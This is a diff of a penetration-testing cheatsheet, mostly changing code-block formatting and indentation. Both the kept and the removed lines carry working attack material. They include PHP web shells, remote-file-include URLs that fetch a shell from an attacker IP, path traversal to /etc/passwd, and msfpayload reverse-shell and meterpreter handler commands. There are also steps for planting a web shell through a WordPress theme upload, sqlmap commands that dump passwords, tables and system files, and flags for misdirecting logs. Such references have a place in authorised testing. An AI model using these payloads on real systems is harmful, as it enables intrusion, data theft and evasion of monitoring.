@@ -7,29 +7,23 @@ The purpose of these cheatsheets is to, essentially, save time during an attack 
 Minimal php command shells
 file cmd.php: PHP script text =>
 ```
-
 <?php system($_GET['cmd']) ?>
+```
+
 or
+```
 <?php system($_REQUEST['cmd']); ?>
+```
 Example usage via Remote File Include (RFI):
+```
 http://<target-ip>/index.php?cmd=<command to execute>&page=http://<attacker-ip>/cmd.php
+```
 Null Bytes (‰00 - html code ampersand, hash 137, 00) may also assist in some cases:
+```
 http://<target-ip>/index.php?cmd=<command to execute>&page=http://<attacker-ip>/cmd.php
 ‰
 e.g.
 http://<attacker-ip>/index.php?system=../../../../../etc/passwd.html
-Encoding windows reverse command shell as asp
-msfpayload windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-nc-port> R | msfencode -t asp -o <filename>.asp
-Encoding meterpreter in asp
-msfpayload windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-multi-handler-port> R | msfencode -t asp -o <filename>.asp
-------
-attacker msfconsole:
-use multi/exploit/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST <attacker-ip>
-set LPORT <attacker-multi-handler-port>
-exploit
-
 ```
 
 http://stackoverflow.com/questions/3115559/exploitable-php-functions
@@ -38,7 +32,6 @@ http://stackoverflow.com/questions/3115559/exploitable-php-functions
 ------------------------------------------------------------------------------------------------------------------
 #### Encoding and Decoding - for backdoors, injection, and (de)obfustication
 ```
-
 http://www.asciitohex.com/
 http://home.paulschou.net/tools/xlate/
 http://www.idea2ic.com/PlayWithJavascript/hexToAscii.html
@@ -78,24 +71,31 @@ Scanning Joomla! for plugins and versions
 #### WordPress
 ```
 WordPress default database configuration filename
-<web-app-path>
+    <web-app-path>
+
 WordPress default login page
-<web-app-path>/wp-login.php
+    <web-app-path>/wp-login.php
+
 WordPress plugins
-<web-app-path>/wp-content/plugins
+    <web-app-path>/wp-content/plugins
+
 Scanning WordPress for plugins and versions
-/pentest/web/wpscan/wpscan.rb --url <target-and-wordpress-path&gt; --proxy <proxy-addr:port> -enumerate [u|p|v|t]
-/pentest/enumeration/web/cms-explorer  -url <target-and-wordpress-path> -type wordpress
+    /pentest/web/wpscan/wpscan.rb --url <target-and-wordpress-path&gt; --proxy <proxy-addr:port> -enumerate [u|p|v|t]
+    /pentest/enumeration/web/cms-explorer  -url <target-and-wordpress-path> -type wordpress
+
 Newer WP: "Themes" can be uploaded as zip files by WP administrators i.e. you:
-mkdir wpx
-vi wpx/cmd.php
-cat wpx/cmd.php
-<?php system($_GET['cmd']) ?>
-zip -r wpx.zip wpx
-upload wpx.zip via web interface as an installed theme
+    mkdir wpx
+    vi wpx/cmd.php
+    cat wpx/cmd.php
+    <?php system($_GET['cmd']) ?>
+    zip -r wpx.zip wpx
+    upload wpx.zip via web interface as an installed theme
+
 Command execution access is via:
-<web-app-path>/wp-content/plugins/wpx/cmd.php?cmd=<command(s)>
-Older WP: Webshells can be added by editing exiting files/themes via the web interface or by enabling file upload and permitting the valid file extension (e.g. .php)
+    <web-app-path>/wp-content/plugins/wpx/cmd.php?cmd=<command(s)>
+
+Older WP:
+     Webshells can be added by editing exiting files/themes via the web interface or by enabling file  upload and permitting the valid file extension (e.g. .php)
 ```
 
 #### Cacti
@@ -228,45 +228,45 @@ http://bernardodamele.blogspot.com.au/2009/01/command-execution-with-mysql-udf.h
 cd /pentest/database/sqlmap
 
 Retrieve SQL Banner, current database and current user; test if the user is the db administrator
-./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" -p <injectable-parameter> --banner --current-db --current-user --is-dba
+    ./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" -p <injectable-parameter> --banner --current-db --current-user --is-dba
 
 Enumerate User Passwords
 ./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --passwords
 
 List of Databases
-./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --dbs
+    ./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --dbs
 
 Retrieve tables from specific Database
-./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --tables -D <database-name>
+    ./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --tables -D <database-name>
 
 Dump specific table contents
-./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --dump -D <database-name> -T <table-name>
+    ./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --dump -D <database-name> -T <table-name>
 
 Retrieve system /etc/password file
-./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/passwd
+    ./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/passwd
 
 Retrieve apache2 configuration file to identify live website config files
-./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/apache2.conf
+    ./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/apache2.conf
 
 Retrieve default configuration file to subsequently identify Document Root (web directory location)
-./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/sites-enabled/000-default
+    ./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=/etc/apache2/sites-enabled/000-default
 
 Retrieve CMS/Web app default configuration file if possible
-./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=<Document-root-path>/<Web-Application-Path>/<configuration-file>
+    ./sqlmap.py -u "http://<target>/index.php?param1=1&param2=2&param3=3" --file-read=<Document-root-path>/<Web-Application-Path>/<configuration-file>
 
 
 Other interesting flags:
---check-waf         Check for existence of WAF/IPS/IDS protection - implementation of nmap http-waf-detect nse script
+    --check-waf         Check for existence of WAF/IPS/IDS protection - implementation of nmap http-waf-detect nse script
 
 
 Some logfile Misdirection flags:
---random-agent      Use randomly selected HTTP User-Agent header
---safe-url=<target-normalised-URL>   Url address to visit frequently during testing
---safe-freq=<num-seconds>  Test requests between two visits to a given safe url
---mobile            Imitate smartphone through HTTP User-Agent header
+    --random-agent      Use randomly selected HTTP User-Agent header
+    --safe-url=<target-normalised-URL>   Url address to visit frequently during testing
+    --safe-freq=<num-seconds>  Test requests between two visits to a given safe url
+    --mobile            Imitate smartphone through HTTP User-Agent header
 ```
 
-------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------
 
 ## Basic Client-side attacks
 #### XSS - iframe
